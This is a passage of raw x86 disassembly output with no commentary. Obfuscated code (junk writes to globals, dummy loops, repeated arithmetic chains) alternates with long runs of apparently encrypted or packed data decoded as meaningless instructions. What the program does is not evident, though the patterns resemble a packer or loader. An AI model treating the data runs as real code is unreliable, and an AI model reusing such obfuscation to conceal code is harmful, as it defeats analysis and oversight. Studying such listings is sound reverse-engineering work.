  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x72142018],0xf
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x406398
  4063d4:	or     al,0x96
  4063d6:	pushf  
  4063d7:	inc    esp
  4063d8:	xchg   ebp,eax
  4063d9:	sub    al,0x58
  4063db:	xor    eax,DWORD PTR [esi]
  4063dd:	jge    0x40640f
  4063df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063e0:	push   ecx
  4063e1:	xor    bh,BYTE PTR [esi]
  4063e3:	jae    0x4063fb
  4063e5:	cmc    
  4063e6:	cdq    
  4063e7:	xor    eax,edi
  4063e9:	pushf  
  4063ea:	fst    QWORD PTR [edi+0x46813382]
  4063f0:	xchg   esp,eax
  4063f1:	addr16 stc 
  4063f3:	mov    eax,0x92099ec0
  4063f8:	les    ebp,FWORD PTR ds:0x5b5e8288
  4063fe:	daa    
  4063ff:	jne    0x406412
  406401:	dec    ebp
  406402:	add    ebx,DWORD PTR [edx+0x5c]
  406405:	inc    edi
  406406:	mov    dl,0xb3
  406408:	push   edi
  406409:	lods   eax,DWORD PTR ds:[esi]
  40640a:	lea    eax,[ebx-0x39]
  40640d:	fsubr  DWORD PTR [ecx]
  40640f:	ins    DWORD PTR es:[edi],dx
  406410:	mov    dl,0xdc
  406412:	scas   eax,DWORD PTR es:[edi]
  406413:	inc    esp
  406414:	mov    ch,0x3f
  406416:	int    0x75
  406418:	cmp    edi,ebx
  40641a:	ror    ebp,1
  40641c:	dec    ecx
  40641d:	rol    BYTE PTR [ebx-0x61d308c],1
  406423:	jo     0x406499
  406425:	mov    ah,0xdf
  406427:	jb     0x406441
  406429:	pop    es
  40642a:	retf   
  40642b:	sub    BYTE PTR [ebx+eiz*2-0x7ff86892],dh
  406432:	push   0xffffffce
  406434:	loop   0x40646d
  406436:	in     eax,0xc
  406438:	outs   dx,DWORD PTR ds:[esi]
  406439:	sahf   
  40643a:	retf   0x802c
  40643d:	cmp    BYTE PTR [ecx],ch
  40643f:	mov    ds:0x587fc535,al
  406444:	in     eax,0x16
  406446:	pop    edi
  406447:	rol    DWORD PTR [edx],cl
  406449:	adc    cl,dh
  40644b:	fucom  st(7)
  40644d:	dec    BYTE PTR [edi+0x268e4273]
  406453:	add    BYTE PTR [edi+0x35de2f34],dl
  406459:	dec    esp
  40645a:	fbld   TBYTE PTR [esi+edx*1]
  40645d:	jnp    0x406487
  40645f:	xchg   edi,eax
  406460:	jl     0x4063ff
  406462:	or     al,bh
  406464:	out    0xbc,al
  406466:	in     eax,0x94
  406468:	adc    eax,0x24a01bbb
  40646d:	lods   al,BYTE PTR ds:[esi]
  40646e:	repz mov esp,0x7e8a9def
  406474:	(bad)  
  406475:	jmp    0x7eeba1f4
  40647a:	mov    ebp,0x3d608150
  40647f:	mov    al,0x78
  406481:	jecxz  0x4064f8
  406483:	stc    
  406484:	and    eax,0x169f3dfe
  406489:	fisub  WORD PTR [esi]
  40648b:	in     al,dx
  40648c:	aad    0xaa
  40648e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648f:	popf   
  406490:	ds ja  0x406446
  406493:	xchg   ebx,eax
  406494:	fs cmp esp,0x9760fbd2
  40649b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40649c:	mov    dh,BYTE PTR ds:0x2ded2473
  4064a2:	(bad)  
  4064a3:	aas    
  4064a4:	mov    bh,al
  4064a6:	xlat   BYTE PTR ds:[ebx]
  4064a7:	adc    eax,0xeca13429
  4064ac:	pop    ebx
  4064ad:	das    
  4064ae:	jl     0x406488
  4064b0:	xor    cx,si
  4064b3:	dec    ecx
  4064b4:	aad    0xcd
  4064b6:	cmp    ch,cl
  4064b8:	cmp    esp,edi
  4064ba:	gs stc 
  4064bc:	mov    ds:0x51338be7,ax
  4064c2:	push   esp
  4064c3:	rol    DWORD PTR [esi],0x4a
  4064c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c7:	pusha  
  4064c8:	call   0x1203:0x1d16e59a
  4064cf:	jp     0x406484
  4064d1:	dec    edx
  4064d2:	push   esp
  4064d3:	gs test al,0x1c
  4064d6:	mov    bh,0x37
  4064d8:	sahf   
  4064d9:	in     eax,dx
  4064da:	mov    edx,0x6075f9e2
  4064df:	jnp    0x406533
  4064e1:	and    eax,0x963c58b0
  4064e6:	popa   
  4064e7:	pop    ecx
  4064e8:	adc    al,0x64
  4064ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064eb:	mov    al,0x59
  4064ed:	fdivr  DWORD PTR [esi]
  4064ef:	daa    
  4064f0:	fdivr  DWORD PTR [ebp+0x6f]
  4064f3:	arpl   di,di
  4064f5:	sub    eax,0xa8b38c6a
  4064fa:	cmp    eax,0x125755a6
  4064ff:	test   BYTE PTR [esi+0x14],cl
  406502:	dec    ecx
  406503:	repnz inc ebx
  406505:	cmp    DWORD PTR [eax+0x3f833bf],edi
  40650b:	stc    
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0xf6ae4057,edi
  406527:	push   es
  406528:	xor    BYTE PTR [edi+0x237e7e0d],bl
  40652e:	jg     0x4065ae
  406530:	jle    0x4064de
  406532:	imul   esi,esp,0x2c
  406535:	sahf   
  406536:	out    dx,eax
  406537:	out    dx,al
  406538:	and    edx,DWORD PTR [ecx+0x1f822984]
  40653e:	scas   al,BYTE PTR es:[edi]
  40653f:	xchg   edx,eax
  406540:	mov    ch,BYTE PTR ds:0x4de20221
  406546:	add    eax,0xc23b0c77
  40654b:	out    dx,al
  40654c:	(bad)  
  40654d:	cmc    
  40654e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654f:	sbb    DWORD PTR es:[edx],ebp
  406552:	sbb    edx,DWORD PTR [ecx+0x39]
  406555:	xlat   BYTE PTR ds:[ebx]
  406556:	test   BYTE PTR [eax+0x4bed3ab9],cl
  40655c:	mov    ecx,0xf3db6f05
  406561:	cmp    BYTE PTR [ebx+0x5e],dl
  406564:	sbb    ecx,esi
  406566:	xchg   DWORD PTR [ecx+0x51],ebp
  406569:	and    ebx,DWORD PTR [esi-0x45]
  40656c:	pop    ebx
  40656d:	mov    ecx,?
  40656f:	mov    dl,0x24
  406571:	inc    ebx
  406572:	lds    esp,FWORD PTR [esi-0x1bdb0886]
  406578:	adc    DWORD PTR [ecx-0x1c],ebp
  40657b:	mov    ecx,0x1621672e
  406580:	ret    0x36c1
  406583:	mov    bl,BYTE PTR [edx+0x277babb0]
  406589:	sbb    al,BYTE PTR [esi-0x6861bcf]
  40658f:	imul   esi,DWORD PTR [eax],0xfffffff3
  406592:	mov    bx,0x86e
  406596:	sub    ah,BYTE PTR [esi+0x41e70b52]
  40659c:	ja     0x40653a
  40659e:	dec    ecx
  40659f:	stc    
  4065a0:	nop
  4065a1:	retf   
  4065a2:	inc    edx
  4065a3:	test   DWORD PTR [edx+0x248aaf8b],ecx
  4065a9:	data16 cld 
  4065ab:	jmp    0x4065f0
  4065ad:	(bad)  
  4065ae:	ficomp WORD PTR [eax+edx*2]
  4065b1:	jp     0x4065e6
  4065b3:	inc    esi
  4065b4:	imul   ah
  4065b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065b7:	mov    ah,BYTE PTR [ebx-0x11]
  4065ba:	test   BYTE PTR [edx],ch
  4065bc:	or     al,0x59
  4065be:	jae    0x4065bc
  4065c0:	jnp    0x4065ee
  4065c2:	push   0xffffff89
  4065c4:	popf   
  4065c5:	iret   
  4065c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c7:	pop    ebx
  4065c8:	shr    DWORD PTR [edx-0x2a],0x3e
  4065cc:	adc    al,0xab
  4065ce:	and    DWORD PTR [esi],esp
  4065d0:	popf   
  4065d1:	inc    edi
  4065d2:	jp     0x4065d7
  4065d4:	and    ebx,edx
  4065d6:	cs in  eax,dx
  4065d8:	xchg   ebx,eax
  4065d9:	jecxz  0x406606
  4065db:	cmp    al,0x49
  4065dd:	inc    ebx
  4065de:	push   ds
  4065df:	inc    esi
  4065e0:	xor    ecx,DWORD PTR [eax]
  4065e2:	inc    ecx
  4065e3:	sub    DWORD PTR [edi-0x4dec2b29],0x5f24463
  4065ed:	cmp    edx,esp
  4065ef:	test   BYTE PTR [esi+esi*4],bl
  4065f2:	pop    edi
  4065f3:	jl     0x40666b
  4065f5:	ror    BYTE PTR [ebx],1
  4065f7:	cmp    DWORD PTR [edx+0x39],ecx
  4065fa:	enter  0x50eb,0x9
  4065fe:	in     al,0x76
  406600:	shl    DWORD PTR [eax+0x70],0x28
  406604:	sub    al,0x13
  406606:	femms  
  406608:	aaa    
  406609:	les    edi,FWORD PTR [ecx+0x1d]
  40660c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660d:	pop    es
  40660e:	arpl   WORD PTR [esp+edx*1-0x23],ax
  406612:	mov    dh,0x7a
  406614:	cmc    
  406615:	nop
  406616:	fidiv  DWORD PTR [edi-0x1a6a02fe]
  40661c:	je     0x40662d
  40661e:	enter  0x47b5,0xae
  406622:	xchg   ebp,eax
  406623:	and    DWORD PTR [ecx-0x6373f55d],eax
  406629:	add    cl,BYTE PTR [ebx-0x692befc1]
  40662f:	jp     0x4066a5
  406631:	jnp    0x4065c8
  406633:	inc    edi
  406634:	cmp    al,0x98
  406636:	les    esi,FWORD PTR [ecx]
  406638:	jmp    0x406620
  40663a:	push   ss
  40663b:	ror    DWORD PTR [ecx],cl
  40663d:	ret    
  40663e:	add    BYTE PTR [esp+eax*2-0x2f4fc46a],0xe6
  406646:	(bad)  
  406647:	lahf   
  406648:	cmp    ebx,DWORD PTR [edx+eax*2-0x49b36728]
  40664f:	sub    eax,0x4c48f4ad
  406654:	pop    eax
  406655:	xchg   ebx,eax
  406656:	pop    ss
  406657:	pop    es
  406658:	push   cs
  406659:	in     al,0xb8
  40665b:	push   ss
  40665c:	adc    DWORD PTR [edx+esi*1-0x219f7ef9],ebp
  406663:	dec    esi
  406664:	aad    0x3d
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	idiv   esp
  40674a:	mov    ebp,0x7e024011
  40674f:	jle    0x406774
  406751:	jg     0x4067d1
  406753:	jle    0x40674c
  406755:	pop    edx
  406756:	adc    DWORD PTR ds:0xa4db1211,0xb90ac902
  406760:	push   ss
  406761:	sbb    DWORD PTR [edx+0x56],ebp
  406764:	out    0x4,eax
  406766:	jmp    DWORD PTR [ebp+0x43]
  406769:	lock fcmovbe st,st(3)
  40676c:	or     DWORD PTR [eax+0x3e],esp
  40676f:	out    0xeb,eax
  406771:	adc    BYTE PTR [edi-0x64],0xc
  406775:	add    bl,BYTE PTR [edi+edx*2+0x61]
  406779:	push   ecx
  40677a:	stos   DWORD PTR es:[edi],eax
  40677b:	in     eax,dx
  40677c:	test   BYTE PTR [eax],ah
  40677e:	lds    edi,FWORD PTR [esp+ebx*1]
  406781:	sar    BYTE PTR [eax-0x1d],0x40
  406785:	shl    BYTE PTR [edi],cl
  406787:	bound  edx,QWORD PTR [edx]
  406789:	dec    edx
  40678a:	je     0x4067b2
  40678c:	mov    edi,0xfe110855
  406791:	jle    0x40677b
  406793:	adc    cl,BYTE PTR [edx+0x60]
  406796:	mov    ebx,0x1d1f39f0
  40679b:	mov    dh,BYTE PTR [ebp+0x1bca4ed4]
  4067a1:	scas   al,BYTE PTR es:[edi]
  4067a2:	and    al,BYTE PTR [esi+0x6cc8f2a0]
  4067a8:	retf   
  4067a9:	fwait
  4067aa:	popa   
  4067ab:	iret   
  4067ac:	or     edx,ecx
  4067ae:	lods   eax,DWORD PTR ds:[esi]
  4067af:	daa    
  4067b0:	jg     0x406810
  4067b2:	pop    esi
  4067b3:	xchg   edi,eax
  4067b4:	adc    DWORD PTR [edx+0x69],ebx
  4067b7:	add    eax,0x5ed4fc76
  4067bc:	ret    
  4067bd:	out    dx,al
  4067be:	xor    BYTE PTR [eax+esi*8-0x73fea77f],cl
  4067c5:	addr16 inc esp
  4067c7:	jp     0x406846
  4067c9:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4067cb:	test   al,0x5e
  4067cd:	push   ebx
  4067ce:	xor    ch,bl
  4067d0:	ss ds sbb eax,0x48a681e2
  4067d7:	frstor [eax]
  4067d9:	out    0xad,al
  4067db:	je     0x406773
  4067dd:	push   esp
  4067de:	fmulp  st(6),st
  4067e0:	cs daa 
  4067e2:	pop    ebp
  4067e3:	mov    cl,0xad
  4067e5:	pop    edx
  4067e6:	sahf   
  4067e7:	or     dh,cl
  4067e9:	cs sub eax,0xcc83f494
  4067ef:	stos   BYTE PTR es:[edi],al
  4067f0:	add    al,0x3a
  4067f2:	or     ch,BYTE PTR [ebx]
  4067f4:	test   eax,0x8c09392
  4067f9:	fucom  st(7)
  4067fb:	popa   
  4067fc:	push   ebx
  4067fd:	mov    cl,0x34
  4067ff:	pop    DWORD PTR [esp+ebx*4+0x28]
  406803:	and    DWORD PTR [edx+0x44412e55],esp
  406809:	sbb    eax,0x7c0f7d23
  40680e:	and    cl,BYTE PTR [esi]
  406810:	or     BYTE PTR ds:0x72f143e8,dl
  406816:	imul   edi,DWORD PTR [ebp+0xb45984],0xdd669957
  406820:	pop    ebp
  406821:	enter  0xf03f,0x6d
  406825:	push   eax
  406826:	mov    ebp,0x14cec621
  40682b:	scas   al,BYTE PTR es:[edi]
  40682c:	sahf   
  40682d:	dec    ebp
  40682e:	(bad)  
  40682f:	lock mov cl,0x15
  406832:	mov    al,ds:0xa92f8138
  406837:	scas   al,BYTE PTR es:[edi]
  406838:	cli    
  406839:	lock cld 
  40683b:	and    eax,0x84cb4fbc
  406840:	stos   DWORD PTR es:[edi],eax
  406841:	xchg   ebx,eax
  406842:	imul   ecx,DWORD PTR [edi+edi*2],0x7a
  406846:	adc    al,0x11
  406848:	xchg   esp,eax
  406849:	imul   esp,DWORD PTR [edi+eax*1],0x9332e207
  406850:	sti    
  406851:	push   edx
  406852:	adc    al,0x9c
  406854:	dec    esp
  406855:	scas   al,BYTE PTR es:[edi]
  406856:	mov    al,ds:0x652a51fc
  40685b:	repz xchg ebx,eax
  40685d:	jp     0x4068a1
  40685f:	mov    dl,0x2
  406861:	push   edx
  406862:	dec    ecx
  406863:	and    al,0x3a
  406865:	or     DWORD PTR [ebx+ecx*2-0x69fafafc],0x1e9bf94
  406870:	mov    eax,ds:0x90fb18e0
  406875:	mov    esp,0x8b1f9bd2
  40687a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40687b:	xor    BYTE PTR [eax],ah
  40687d:	xchg   edx,eax
  40687e:	mov    ds:0x409bf28b,eax
  406883:	ror    BYTE PTR [ecx-0x5244370b],0x3
  40688a:	push   ebp
  40688b:	rol    bh,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xf0
  4068b9:	or     esi,DWORD PTR [edx+0x7e007580]
  4068bf:	jle    0x4068e4
  4068c1:	jg     0x406941
  4068c3:	jle    0x406866
  4068c5:	loop   0x406908
  4068c7:	xor    al,dl
  4068c9:	mov    dh,0xe4
  4068cb:	ins    DWORD PTR es:[edi],dx
  4068cc:	sbb    ebp,DWORD PTR [edx-0x41dde204]
  4068d2:	retf   0xd077
  4068d5:	adc    BYTE PTR [edx+0xc],cl
  4068d8:	ror    bl,0xed
  4068db:	jne    0x406908
  4068dd:	sbb    edx,DWORD PTR [eax+0x6e]
  4068e0:	std    
  4068e1:	pop    ebp
  4068e2:	and    bh,0x6e
  4068e5:	retf   0xcae7
  4068e8:	or     eax,0x8e8d95aa
  4068ed:	push   edi
  4068ee:	jp     0x406954
  4068f0:	test   al,0x1f
  4068f2:	(bad)  
  4068f3:	pop    edx
  4068f4:	mov    bh,0x36
  4068f6:	sbb    eax,0xfc51c0f0
  4068fb:	jmp    0x3c1e:0x3c00aef
  406902:	out    dx,eax
  406903:	push   0x48
  406905:	jg     0x4068eb
  406907:	xchg   ch,dh
  406909:	hlt    
  40690a:	js     0x40689e
  40690c:	loop   0x4068d1
  40690e:	add    ebx,DWORD PTR [eax+0x2cc2c7ac]
  406914:	mov    eax,DWORD PTR [esi-0x27]
  406917:	xor    bh,ah
  406919:	and    al,BYTE PTR [ecx+0x14]
  40691c:	or     eax,0x704683cd
  406921:	adc    esi,ebp
  406923:	pop    edx
  406924:	and    dl,BYTE PTR [ebp+0x50b910c0]
  40692a:	imul   edi,DWORD PTR [ebp+ecx*4-0x6cb88c26],0xffffffe7
  406932:	scas   al,BYTE PTR es:[edi]
  406933:	fild   WORD PTR [ebx+0x4c]
  406936:	push   0x769bc523
  40693b:	cdq    
  40693c:	mov    WORD PTR [esi+edi*2+0x1a9765d7],cs
  406943:	loopne 0x406937
  406945:	js     0x4068e6
  406947:	xchg   esp,eax
  406948:	or     DWORD PTR [edx+0x79],ebp
  40694b:	mov    ss,WORD PTR [ecx-0x18df8bb0]
  406951:	fwait
  406952:	stos   BYTE PTR es:[edi],al
  406953:	pop    esp
  406954:	nop
  406955:	add    eax,0x6111fdea
  40695a:	aad    0x85
  40695c:	mov    al,ds:0xde1ded
  406961:	dec    edx
  406962:	mov    edi,0xe0a8cfd6
  406967:	mov    edx,0x8d9340da
  40696c:	mov    ecx,0xc02067cb
  406971:	or     DWORD PTR [esi+0x64cd708a],eax
  406977:	push   es
  406978:	dec    ebp
  406979:	in     eax,dx
  40697a:	dec    ecx
  40697b:	sbb    DWORD PTR [edi+edi*1+0x73],edx
  40697f:	or     BYTE PTR [ebx+eax*8],bl
  406982:	or     eax,0x3c8e0df0
  406987:	adc    DWORD PTR [ecx],0xffffff97
  40698a:	loope  0x406926
  40698c:	adc    BYTE PTR [ebp-0x18a4ed18],al
  406992:	mov    DWORD PTR [esi],ebp
  406994:	xchg   ecx,eax
  406995:	pushf  
  406996:	test   al,0x6a
  406998:	jg     0x4069ed
  40699a:	push   edx
  40699b:	cs jecxz 0x406968
  40699e:	inc    ebp
  40699f:	push   ds
  4069a0:	xchg   ebx,eax
  4069a1:	clc    
  4069a2:	mov    bl,0x1d
  4069a4:	loope  0x40698f
  4069a6:	sub    al,0x73
  4069a8:	lods   al,BYTE PTR ds:[esi]
  4069a9:	rcr    DWORD PTR [edi-0x6d0efd98],cl
  4069af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069b0:	mov    dh,0x1c
  4069b2:	or     eax,0x82288e33
  4069b7:	imul   esi,DWORD PTR [esi+ebp*1+0x29],0xffffffb8
  4069bc:	add    ebx,esp
  4069be:	push   ecx
  4069bf:	or     BYTE PTR [edx],al
  4069c1:	inc    esi
  4069c2:	retf   
  4069c3:	xchg   ecx,eax
  4069c4:	xor    BYTE PTR [edx],ch
  4069c6:	pop    esp
  4069c7:	arpl   bp,sp
  4069c9:	push   ecx
  4069ca:	in     eax,0x85
  4069cc:	rcr    DWORD PTR [edi-0x6651aea3],0xa8
  4069d3:	scas   eax,DWORD PTR es:[edi]
  4069d4:	jl     0x4069ea
  4069d6:	adc    eax,0x19408471
  4069db:	cmp    ecx,esi
  4069dd:	repnz xor al,0x94
  4069e0:	lea    eax,[ecx+ebp*4]
  4069e3:	out    0xe0,al
  4069e5:	or     DWORD PTR es:[edi+0x5a72b324],edi
  4069ec:	dec    edx
  4069ed:	add    al,BYTE PTR [eax+0x3d]
  4069f0:	imul   esi,DWORD PTR [eax+0x6f],0xfffffffe
  4069f4:	adc    ebx,0xffffffbc
  4069f7:	cmp    al,0x66
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0xb5867a93
  406a0e:	or     bh,BYTE PTR es:[esi]
  406a11:	add    DWORD PTR [esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069f4
  406a19:	push   es
  406a1a:	push   ds
  406a1b:	or     DWORD PTR [ebx+0x26605c12],ebp
  406a21:	jo     0x406a61
  406a23:	ja     0x406a4b
  406a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a26:	aad    0xb9
  406a28:	mov    ecx,0x3d457162
  406a2d:	dec    ecx
  406a2e:	cmp    ebx,DWORD PTR [esp+eax*4+0xc]
  406a32:	mov    esi,0x737c06f8
  406a37:	mov    BYTE PTR [edi],bh
  406a39:	mov    dl,0xe0
  406a3b:	add    al,bh
  406a3d:	loopne 0x406a97
  406a3f:	xchg   BYTE PTR [eax],bl
  406a41:	or     ah,ch
  406a43:	mov    ds:0x229363e4,al
  406a48:	cs sar bh,1
  406a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a4c:	(bad)  
  406a4d:	lock rcl DWORD PTR [ecx],cl
  406a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a51:	mov    ds:0xcc593388,al
  406a56:	hlt    
  406a57:	icebp  
  406a58:	iret   
  406a59:	ret    0xbfc5
  406a5c:	(bad)  
  406a5d:	lods   eax,DWORD PTR ds:[esi]
  406a5e:	fidivr DWORD PTR [esi+0x30]
  406a61:	push   ebx
  406a62:	or     edx,DWORD PTR [edi+0x7736dbee]
  406a68:	or     eax,0x1668b284
  406a6d:	das    
  406a6e:	call   0x227963a3
  406a73:	aad    0xaf
  406a75:	std    
  406a76:	jmp    0x2c92:0xd49beac
  406a7d:	fcom   DWORD PTR [ebp+0xc4f3dfc]
  406a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a84:	push   0x509c16f1
  406a89:	adc    BYTE PTR [esi-0x44959cd5],dl
  406a8f:	sub    BYTE PTR [ebp+0x77faf62d],dl
  406a95:	inc    eax
  406a96:	jo     0x406afa
  406a98:	jb     0x406a99
  406a9a:	ss cwde 
  406a9c:	cwde   
  406a9d:	adc    ch,BYTE PTR [edx+0xf]
  406aa0:	icebp  
  406aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa2:	pop    ecx
  406aa3:	inc    edi
  406aa4:	sbb    al,0xba
  406aa6:	pop    ds
  406aa7:	push   eax
  406aa8:	push   ebx
  406aa9:	xor    bh,BYTE PTR [esi-0x76]
  406aac:	lahf   
  406aad:	ds xchg edi,eax
  406aaf:	loope  0x406ac3
  406ab1:	fwait
  406ab2:	add    al,dl
  406ab4:	mov    eax,ds:0x8f3d5d5b
  406ab9:	jmp    0x4cf2:0xb3d9e3d3
  406ac0:	icebp  
  406ac1:	rol    BYTE PTR [ebp-0x73],0xbc
